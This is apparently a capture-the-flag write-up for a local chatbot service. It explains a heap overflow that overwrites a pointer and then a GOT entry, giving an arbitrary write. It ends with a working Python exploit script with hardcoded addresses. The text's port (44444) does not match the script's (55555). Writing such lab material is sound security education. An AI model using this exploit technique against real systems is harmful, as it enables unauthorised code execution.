# Vulnerability
----
This challenge takes place on a TCP service running on localhost port 44444, simulating a chatbot. The binary is 32-bit, compiled with `-fno-pie -no-pie -m32`.
It is very similar to the [[H34pfun]] challenge. So let's start on the source code analyse.
### Vulnerable function : 

```C
void try_to_hack_me(int fd, char *input) {
  struct data *d1, *d2;

  d1 = malloc(sizeof(struct data));
  d1->secret = malloc(163);
  d2 = malloc(sizeof(struct data));
  d2->secret = malloc(46);

  strcpy(d1->secret, input + 16);
  strcpy(d2->secret, input + pos + 1);
```

This vulnerability is a **heap overflow leading to a GOT overwrite**.

`d1->secret` is allocated with 163 bytes, but `strcpy` copies user input without any size check. Since `d1`, `d1->secret`, `d2`, and `d2->secret` are allocated consecutively on the heap, overflowing `d1->secret` by **176 bytes** overwrites the pointer stored in `d2` — which points to `d2->secret`.

The second `strcpy` then writes attacker-controlled data (`partie2`) to whatever address was placed in `d2->secret`. By pointing it at the **GOT entry of `puts`** and writing the address of `spawn_alpha`, the next call to `puts()` jumps to `spawn_alpha` instead, leaking the flag.

This is dangerous because it gives an attacker an **arbitrary write primitive** — write anything, anywhere in memory.

# PoC

```bash
import socket, time, struct

s = socket.socket()
s.connect(('localhost', 55555))
time.sleep(2)
s.recv(4096)
GOT_PUTS    = 0x0804c03c
SPAWN_ALPHA = 0x080494e1
partie1 = b'A' * 176 + struct.pack('<I', GOT_PUTS)
partie2 = struct.pack('<I', SPAWN_ALPHA)
payload = b'let me hack you ' + partie1 + b'$' + partie2
s.send(payload + b'\n')
time.sleep(10)
print(s.recv(65536))
```
